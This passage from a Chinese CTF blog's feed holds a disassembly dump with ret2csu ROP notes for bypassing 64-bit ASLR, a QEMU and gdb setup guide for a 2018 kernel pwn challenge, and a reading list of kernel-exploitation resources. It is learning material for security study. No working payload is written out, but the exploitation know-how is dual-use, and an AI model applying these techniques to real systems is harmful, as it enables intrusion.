&lt;register_tm_clones+0x38&gt;</span><br><span class="line">  400473:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400478:48 85 c0             test   %rax,%rax</span><br><span class="line">  40047b:74 0b                je     400488 &lt;register_tm_clones+0x38&gt;</span><br><span class="line">  40047d:5d                   pop    %rbp</span><br><span class="line">  40047e:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400483:ff e0                jmpq   *%rax</span><br><span class="line">  400485:0f 1f 00             nopl   (%rax)</span><br><span class="line">  400488:5d                   pop    %rbp</span><br><span class="line">  400489:c3                   retq   </span><br><span class="line">  40048a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400490 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line">  400490:80 3d 99 0b 20 00 00 cmpb   $0x0,0x200b99(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  400497:75 11                jne    4004aa &lt;__do_global_dtors_aux+0x1a&gt;</span><br><span class="line">  400499:55                   push   %rbp</span><br><span class="line">  40049a:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40049d:e8 6e ff ff ff       callq  400410 &lt;deregister_tm_clones&gt;</span><br><span class="line">  4004a2:5d                   pop    %rbp</span><br><span class="line">  4004a3:c6 05 86 0b 20 00 01 movb   $0x1,0x200b86(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  4004aa:f3 c3                repz retq </span><br><span class="line">  4004ac:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004004b0 &lt;frame_dummy&gt;:</span><br><span class="line">  4004b0:bf 20 0e 60 00       mov    $0x600e20,%edi</span><br><span class="line">  4004b5:48 83 3f 00          cmpq   $0x0,(%rdi)</span><br><span class="line">  4004b9:75 05                jne    4004c0 &lt;frame_dummy+0x10&gt;</span><br><span class="line">  4004bb:eb 93                jmp    400450 &lt;register_tm_clones&gt;</span><br><span class="line">  4004bd:0f 1f 00             nopl   (%rax)</span><br><span class="line">  4004c0:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004c5:48 85 c0             test   %rax,%rax</span><br><span class="line">  4004c8:74 f1                je     4004bb &lt;frame_dummy+0xb&gt;</span><br><span class="line">  4004ca:55                   push   %rbp</span><br><span class="line">  4004cb:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004ce:ff d0                callq  *%rax</span><br><span class="line">  4004d0:5d                   pop    %rbp</span><br><span class="line">  4004d1:e9 7a ff ff ff       jmpq   400450 &lt;register_tm_clones&gt;</span><br><span class="line"></span><br><span class="line">00000000004004d6 &lt;main&gt;:</span><br><span class="line">  4004d6:55                   push   %rbp</span><br><span class="line">  4004d7:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004da:89 7d fc             mov    %edi,-0x4(%rbp)</span><br><span class="line">  4004dd:48 89 75 f0          mov    %rsi,-0x10(%rbp)</span><br><span class="line">  4004e1:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004e6:5d                   pop    %rbp</span><br><span class="line">  4004e7:c3                   retq   </span><br><span class="line">  4004e8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4004ef:00 </span><br><span class="line"></span><br><span class="line">00000000004004f0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4004f0:41 57                push   %r15</span><br><span class="line">  4004f2:41 56                push   %r14</span><br><span class="line">  4004f4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4004f7:41 55                push   %r13</span><br><span class="line">  4004f9:41 54                push   %r12</span><br><span class="line">  4004fb:4c 8d 25 0e 09 20 00 lea    0x20090e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  400502:55                   push   %rbp</span><br><span class="line">  400503:48 8d 2d 0e 09 20 00 lea    0x20090e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  40050a:53                   push   %rbx</span><br><span class="line">  40050b:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  40050e:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  400511:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  400514:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400518:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  40051c:e8 6f fe ff ff       callq  400390 &lt;_init&gt;</span><br><span class="line">  400521:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  400524:74 20                je     400546 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  400526:31 db                xor    %ebx,%ebx</span><br><span class="line">  400528:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  40052f:00 </span><br><span class="line">  400530:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400533:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400536:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400539:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40053d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400541:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400544:75 ea                jne    400530 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400546:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40054a:5b                   pop    %rbx</span><br><span class="line">  40054b:5d                   pop    %rbp</span><br><span class="line">  40054c:41 5c                pop    %r12</span><br><span class="line">  40054e:41 5d                pop    %r13</span><br><span class="line">  400550:41 5e                pop    %r14</span><br><span class="line">  400552:41 5f                pop    %r15</span><br><span class="line">  400554:c3                   retq   </span><br><span class="line">  400555:90                   nop</span><br><span class="line">  400556:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40055d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400560 &lt;__libc_csu_fini&gt;:</span><br><span class="line">  400560:f3 c3                repz retq </span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">0000000000400564 &lt;_fini&gt;:</span><br><span class="line">  400564:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400568:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40056c:c3                   retq</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091806.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091751.png" alt=""><br>我们把除了application source code之外的其他函数称为The Attached code<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-104551.png" alt=""></p><h3 id="64-bit-ASLR-bypass"><a href="#64-bit-ASLR-bypass" class="headerlink" title="64-bit ASLR bypass"></a>64-bit ASLR bypass</h3><ol><li>手动分析“attached code”，寻找ROP-chain,劫持控制流。</li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110704.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110721.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110731.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111109.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111502.png" alt=""></p><p><strong>blackhole里</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110833.png" alt=""></p><ol><li>分析plt和got，用urop来leak libc地址</li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111629.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111746.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-113814.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-121318.png" alt=""></p><ol><li>使用libc构造rop-chain<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-121852.png" alt=""></li></ol><h3 id="什么时候我们能使用return-to-csu"><a href="#什么时候我们能使用return-to-csu" class="headerlink" title="什么时候我们能使用return to csu"></a>什么时候我们能使用return to csu</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-122304.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;议题下载链接&quot;&gt;&lt;a href=&quot;#议题下载链接&quot; class=&quot;headerlink&quot; title=&quot;议题下载链接&quot;&gt;&lt;/a&gt;议题下载链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/docs/asia-18/asia-18
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="ret2csu" scheme="http://eternalsakura13.com/tags/ret2csu/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2018 core环境搭建</title>
    <link href="http://eternalsakura13.com/2018/03/31/b_core/"/>
    <id>http://eternalsakura13.com/2018/03/31/b_core/</id>
    <published>2018-03-30T17:04:32.212Z</published>
    <updated>2018-03-30T18:13:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar</a></p><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>ubuntu14.04<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p><p>gdb 7.7.1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb -v</span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br></pre></td></tr></table></figure></p><h3 id="下载qemu"><a href="#下载qemu" class="headerlink" title="下载qemu"></a>下载qemu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-system</span><br></pre></td></tr></table></figure><h3 id="打开虚拟化"><a href="#打开虚拟化" class="headerlink" title="打开虚拟化"></a>打开虚拟化</h3><p>这个在cpu那里<br>vm版本：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172405.jpg" alt=""><br>pd版本：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172455.png" alt=""></p><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><p>本来这样应该就可以了，不过有几个坑点我还是要说一下。</p><ul><li>-m megs         set virtual RAM size to megs MB [default=128]<br>原先shell里指定的是64M，这样会GG，起码改成128M，觉得不够还可以加。</li><li>-kernel bzImage use ‘bzImage’ as kernel image<br>指定kernel image</li><li>-initrd file    use ‘file’ as initial ram disk<br>要运行不能只有内核，这里是相当于指定一个硬盘（使用软件将RAM模拟当做硬盘来使用）<br>cpio是一种文件系统，后面解包就看懂了。</li><li>-append cmdline use ‘cmdline’ as kernel command line<br>没什么好说的，调试的时候可以关了kaslr，指定no kaslr</li><li>-s              shorthand for -gdb tcp::1234<br>这东西坑了我很久，意思是-gdb tcp::1234这个命令的缩写，所以你在后面再指定gdb，或者进了monitor（这种方法参考muhe师傅的<a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">文章</a>,也就是启动时按ctrl+alt+2，反正mac的虚拟机里没法按……我就不这样了）再运行gdbserver都会报 Duplicate ID ‘gdb’ for chardev。</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172604.png" alt=""></p><p>这样运行shell应该就可以了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174142.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174124.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174156.png" alt=""></p><h3 id="关闭定时power-down"><a href="#关闭定时power-down" class="headerlink" title="关闭定时power down"></a>关闭定时power down</h3><p>类似alarm，如图，直接自己就结束了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174239.jpg" alt=""><br>要改掉这个，也是删掉一个配置就行了，不过这个要在init里改了，如图，就是这句，删掉就好了<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174550.png" alt=""><br>而我们知道实际上这个硬盘是那个cpio文件,所以要删除这句话的话，首先需要解包cpio，删了这句话，然后重新打包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mkdir core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mv core.cpio ./core/core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ cd core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ gunzip core.cpio.gz </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cpio -idmv &lt; core.cpio</span><br><span class="line">.</span><br><span class="line">bin</span><br><span class="line">bin/ionice</span><br><span class="line">bin/iostat</span><br><span class="line">bin/ipcalc</span><br><span class="line">bin/kbd_mode</span><br><span class="line">bin/linux32</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root</span><br><span class="line">root/flag</span><br><span class="line">core.ko</span><br><span class="line">tmp</span><br><span class="line">init</span><br><span class="line">vmlinux</span><br><span class="line">104379 blocks</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ rm -rf core.cpio </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ vim init</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ./gen_cpio.sh core.cpio</span><br><span class="line">.</span><br><span class="line">./usr</span><br><span class="line">./usr/sbin</span><br><span class="line">./usr/sbin/delgroup</span><br><span class="line">./usr/sbin/i2cdump</span><br><span class="line">./usr/sbin/rtcwake</span><br><span class="line">./usr/sbin/i2cget</span><br><span class="line">./usr/sbin/ubiattach</span><br><span class="line">./usr/sbin/dhcprelay</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">./bin/ping</span><br><span class="line">./bin/busybox</span><br><span class="line">./bin/kbd_mode</span><br><span class="line">./bin/sh</span><br><span class="line">./bin/grep</span><br><span class="line">./bin/base64</span><br><span class="line">./bin/mount</span><br><span class="line">104379 blocks</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ mv core.cpio ../core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cd ..</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ rm -rf core</span><br></pre></td></tr></table></figure></p><p>解释一下，上面这些log里最重要的就是cpio的解包和打包。</p><ol><li><p>解包的坑点是cpio文件应该这么解压,先用gunzip，再用cpio -idmv，但是gunzip认后缀不认文件格式，所以我们要先重命名为core.cpio.gz，再cpio -idmv提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip 文件名.cpio.gz</span><br><span class="line">cpio -idmv &lt; 文件名.cpio</span><br></pre></td></tr></table></figure></li><li><p>打包这个……师傅告诉我里面的gen_cpio.sh就是打包的shell,$1是我们输入的参数，也就是要输出的文件名。<br>比如./gen_cpio.sh core.cpio就代表打包后输出的文件名为core.cpio。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1</span><br></pre></td></tr></table></figure></li></ol><p>可以看到这样就删掉了，就不会2分钟后自动终止了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-175856.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>这样我们的搭建就完成了，看上去不复杂，我还是踩坑踩了一晚上，不过这样qemu+gdb调试kernel其实也会了(我后面应该会写怎么搭建)<br>感谢师傅们指导了QVQ。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/CTF/pwn/kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>kernel pwn资料整理（更新ing)</title>
    <link href="http://eternalsakura13.com/2018/03/29/kernel/"/>
    <id>http://eternalsakura13.com/2018/03/29/kernel/</id>
    <published>2018-03-28T18:18:07.337Z</published>
    <updated>2018-03-29T16:28:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><p>进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。</p><h3 id="Interactive-map-of-Linux-kernel"><a href="#Interactive-map-of-Linux-kernel" class="headerlink" title="Interactive map of Linux kernel"></a>Interactive map of Linux kernel</h3><p><a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">http://www.makelinux.net/kernel_map/</a></p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani"><a href="#《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani" class="headerlink" title="《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani"></a>《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani</h3><p><a href="http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8" target="_blank" rel="noopener">http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8</a></p><h3 id="《Linux-Kernel-Architecture》，Wolfgang-Mauerer"><a href="#《Linux-Kernel-Architecture》，Wolfgang-Mauerer" class="headerlink" title="《Linux Kernel Architecture》，Wolfgang Mauerer"></a>《Linux Kernel Architecture》，Wolfgang Mauerer</h3><p><a href="http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79" target="_blank" rel="noopener">http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79</a></p><h3 id="《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds"><a href="#《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds" class="headerlink" title="《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds"></a>《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds</h3><p><a href="http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC" target="_blank" rel="noopener">http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC</a></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="Linux内核源码"><a href="#Linux内核源码" class="headerlink" title="Linux内核源码"></a>Linux内核源码</h3><p><a href="https://github.com/torvalds/linux" target="_blank" rel="noopener">https://github.com/torvalds/linux</a></p><h3 id="Linux各版本内核"><a href="#Linux各版本内核" class="headerlink" title="Linux各版本内核"></a>Linux各版本内核</h3><p><a href="https://www.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://www.kernel.org/pub/linux/kernel/</a></p><h3 id="Linux内核代码在线查看"><a href="#Linux内核代码在线查看" class="headerlink" title="Linux内核代码在线查看"></a>Linux内核代码在线查看</h3><p><a href="http://lxr.free-electrons.com" target="_blank" rel="noopener">http://lxr.free-electrons.com</a></p><h2 id="exp及分析文章"><a href="#exp及分析文章" class="headerlink" title="exp及分析文章"></a>exp及分析文章</h2><h3 id="linux-kernel-exploits"><a href="#linux-kernel-exploits" class="headerlink" title="linux-kernel-exploits"></a>linux-kernel-exploits</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p><h3 id="kernel-exploit"><a href="#kernel-exploit" class="headerlink" title="kernel exploit"></a>kernel exploit</h3><p><a href="https://github.com/lucyoa/kernel-exploits" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits</a></p><h3 id="kernel-heap-overflow利用"><a href="#kernel-heap-overflow利用" class="headerlink" title="kernel heap overflow利用"></a>kernel heap overflow利用</h3><p><a href="https://zhuanlan.zhihu.com/p/26674557" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26674557</a></p><h3 id="kernel-exploit-适合入门"><a href="#kernel-exploit-适合入门" class="headerlink" title="kernel exploit(适合入门)"></a>kernel exploit(适合入门)</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf</a></p><h3 id="blackhat-kernel议题"><a href="#blackhat-kernel议题" class="headerlink" title="blackhat kernel议题"></a>blackhat kernel议题</h3><p><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf</a></p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h3 id="syzkaller"><a href="#syzkaller" class="headerlink" title="syzkaller"></a>syzkaller</h3><p>这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境<br><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><h3 id="Awesome-Fuzzing"><a href="#Awesome-Fuzzing" class="headerlink" title="Awesome-Fuzzing"></a>Awesome-Fuzzing</h3><p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="x86-64-Assembly"><a href="#x86-64-Assembly" class="headerlink" title="x86_64 Assembly"></a>x86_64 Assembly</h3><p><a href="https://0xax.github.io/categories/assembler/" target="_blank" rel="noopener">https://0xax.github.io/categories/assembler/</a></p><h3 id="64-bit-system-call-numbers-and-entry-vectors"><a href="#64-bit-system-call-numbers-and-entry-vectors" class="headerlink" title="64-bit system call numbers and entry vectors"></a>64-bit system call numbers and entry vectors</h3><p><a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p><h3 id="翻过的文章记录"><a href="#翻过的文章记录" class="headerlink" title="翻过的文章记录"></a>翻过的文章记录</h3><p>深入理解linux系统下proc文件系统内容<br><a href="http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html" target="_blank" rel="noopener">http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html</a><br>What is mode_t in C?<br><a href="https://jameshfisher.com/2017/02/24/what-is-mode_t.html" target="_blank" rel="noopener">https://jameshfisher.com/2017/02/24/what-is-mode_t.html</a><br>Understanding a Kernel Oops!<br><a href="http://opensourceforu.com/2011/01/understanding-a-kernel-oops/" target="_blank" rel="noopener">http://opensourceforu.com/2011/01/understanding-a-kernel-oops/</a><br>Linux Kernel Procfs Guide<br><a href="https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf" target="_blank" rel="noopener">https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf</a><br>用户空间与内核空间数据交换的方式(2)——procfs<br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html" target="_blank" rel="noopener">http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html</a><br>用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user<br><a href="http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html" target="_blank" rel="noopener">http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html</a><br>谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”<br><a href="https://blog.csdn.net/comwise/article/details/9087279" target="_blank" rel="noopener">https://blog.csdn.net/comwise/article/details/9087279</a><br>Root exploit for Android and Linux（CVE-2010-4258）<br><a href="https://blog.csdn.net/hu3167343/article/details/36892563" target="_blank" rel="noopener">https://blog.csdn.net/hu3167343/article/details/36892563</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux-kernel&quot;&gt;&lt;a href=&quot;#linux-kernel&quot; class=&quot;headerlink&quot; title=&quot;linux kernel&quot;&gt;&lt;/a&gt;linux kernel&lt;/h2&gt;&lt;p&gt;进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/CTF/pwn/kernel/"/>
    
    
  </entry>
  
